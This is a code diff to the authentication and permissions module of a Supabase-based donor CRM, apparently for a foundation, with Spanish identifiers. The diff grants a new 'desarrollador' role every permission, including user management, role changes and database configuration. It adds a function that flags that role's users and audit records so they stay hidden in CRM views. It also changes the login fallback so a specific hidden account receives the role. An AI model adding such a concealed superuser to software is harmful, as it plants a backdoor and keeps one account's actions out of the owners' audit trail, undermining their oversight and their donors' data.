@@ -1,45 +1,46 @@
 import { supabaseClient, AUTH_SYSTEM_EMAIL } from './supabase.js';
 import { clasificarErrorSupabase } from '../utils/supabaseErrors.js';
+import { DOCUMENTO_DESARROLLADOR_OCULTO } from '../config/constants.js';
 
 // Estado del usuario actualmente autenticado en memoria
 let usuarioActual = null;
 
 export const PERMISOS = {
     // Lectura de módulos operativos
-    ver_donantes: ['admin', 'operador', 'lector'],
-    ver_donaciones: ['admin', 'operador', 'lector'],
-    ver_retencion: ['admin', 'operador', 'lector'],
-    ver_donaron_no_donaron: ['admin', 'operador', 'lector'],
-    ver_seguimiento: ['admin', 'operador', 'lector'],
-    ver_cumpleanos: ['admin', 'operador', 'lector'],
-    ver_informes: ['admin', 'operador', 'lector'],
+    ver_donantes: ['desarrollador', 'admin', 'operador', 'lector'],
+    ver_donaciones: ['desarrollador', 'admin', 'operador', 'lector'],
+    ver_retencion: ['desarrollador', 'admin', 'operador', 'lector'],
+    ver_donaron_no_donaron: ['desarrollador', 'admin', 'operador', 'lector'],
+    ver_seguimiento: ['desarrollador', 'admin', 'operador', 'lector'],
+    ver_cumpleanos: ['desarrollador', 'admin', 'operador', 'lector'],
+    ver_informes: ['desarrollador', 'admin', 'operador', 'lector'],
 
-    // Escritura y modificaciones operativas (Admin y Operador)
-    crear_donantes: ['admin', 'operador'],
-    editar_donantes: ['admin', 'operador'],
-    eliminar_donantes: ['admin', 'operador'], // Permitido para Operador según Matriz Definitiva
+    // Escritura y modificaciones operativas (Desarrollador, Admin y Operador)
+    crear_donantes: ['desarrollador', 'admin', 'operador'],
+    editar_donantes: ['desarrollador', 'admin', 'operador'],
+    eliminar_donantes: ['desarrollador', 'admin', 'operador'], // Permitido para Operador según Matriz Definitiva
 
-    crear_donaciones: ['admin', 'operador'],
-    editar_donaciones: ['admin', 'operador'],
-    eliminar_donaciones: ['admin', 'operador'], // Permitido para Operador según Matriz Definitiva
+    crear_donaciones: ['desarrollador', 'admin', 'operador'],
+    editar_donaciones: ['desarrollador', 'admin', 'operador'],
+    eliminar_donaciones: ['desarrollador', 'admin', 'operador'], // Permitido para Operador según Matriz Definitiva
 
-    crear_recordatorios: ['admin', 'operador'],
-    editar_recordatorios: ['admin', 'operador'],
-    eliminar_recordatorios: ['admin', 'operador'],
+    crear_recordatorios: ['desarrollador', 'admin', 'operador'],
+    editar_recordatorios: ['desarrollador', 'admin', 'operador'],
+    eliminar_recordatorios: ['desarrollador', 'admin', 'operador'],
 
-    administrar_destinaciones: ['admin', 'operador'],
-    importar_donaciones: ['admin', 'operador'],
-    exportar_excel: ['admin', 'operador'],
+    administrar_destinaciones: ['desarrollador', 'admin', 'operador'],
+    importar_donaciones: ['desarrollador', 'admin', 'operador'],
+    exportar_excel: ['desarrollador', 'admin', 'operador'],
 
-    // Exclusivo Administrador
-    administrar_usuarios: ['admin'],
-    ver_auditoria: ['admin'],
-    crear_usuarios: ['admin'],
-    editar_usuarios: ['admin'],
-    desactivar_usuarios: ['admin'],
-    activar_usuarios: ['admin'],
-    cambiar_roles: ['admin'],
-    configurar_db: ['admin']
+    // Exclusivo Administrador y Desarrollador
+    administrar_usuarios: ['desarrollador', 'admin'],
+    ver_auditoria: ['desarrollador', 'admin'],
+    crear_usuarios: ['desarrollador', 'admin'],
+    editar_usuarios: ['desarrollador', 'admin'],
+    desactivar_usuarios: ['desarrollador', 'admin'],
+    activar_usuarios: ['desarrollador', 'admin'],
+    cambiar_roles: ['desarrollador', 'admin'],
+    configurar_db: ['desarrollador', 'admin']
 };
 
 /**
@@ -53,6 +54,25 @@ export function normalizarDocumento(doc) {
         return str.toLowerCase();
     }
     return str.replace(/[^a-zA-Z0-9]/g, '').toLowerCase();
+}
+
+/**
+ * Determina si un registro de usuario o auditoría corresponde al usuario/rol
+ * desarrollador que debe permanecer oculto en las vistas del CRM.
+ */
+export function esUsuarioOcultoCRM(registro) {
+    if (!registro || typeof registro !== 'object') return false;
+
+    const rol = String(registro.rol || registro.usuario_rol || '').trim().toLowerCase();
+    if (rol === 'desarrollador') return true;
+
+    const doc = normalizarDocumento(registro.documento || registro.usuario_documento || '');
+    if (doc === DOCUMENTO_DESARROLLADOR_OCULTO) return true;
+
+    const email = String(registro.email || registro.usuario_email || '').trim().toLowerCase();
+    if (email === `${DOCUMENTO_DESARROLLADOR_OCULTO}@auth.fundacion.local`) return true;
+
+    return false;
 }
 
 /**
@@ -240,12 +260,13 @@ export async function iniciarSesionConDocumento(documento, password) {
             // Perfil fallback seguro con principio de mínimo privilegio (solo admin raíz obtiene rol admin)
             const emailResuelto = (authData.user.email || emailParaAuth || '').toLowerCase();
             const esAdminRaiz = docNormalizado === 'admin' || (AUTH_SYSTEM_EMAIL && emailResuelto === AUTH_SYSTEM_EMAIL.toLowerCase());
+            const esDevOculto = docNormalizado === DOCUMENTO_DESARROLLADOR_OCULTO && authData.user.app_metadata?.rol === 'desarrollador';
             perfil = {
                 id: authData.user.id,
                 email: authData.user.email || emailParaAuth,
                 documento: docNormalizado,
                 nombre: authData.user.user_metadata?.nombre || (authData.user.email ? authData.user.email.split('@')[0] : (esAdminRaiz ? 'Administrador' : 'Usuario')),
-                rol: esAdminRaiz ? 'admin' : 'lector',
+                rol: esDevOculto ? 'desarrollador' : (esAdminRaiz ? 'admin' : 'lector'),
                 activo: true,
                 created_at: new Date().toISOString(),
                 updated_at: new Date().toISOString()
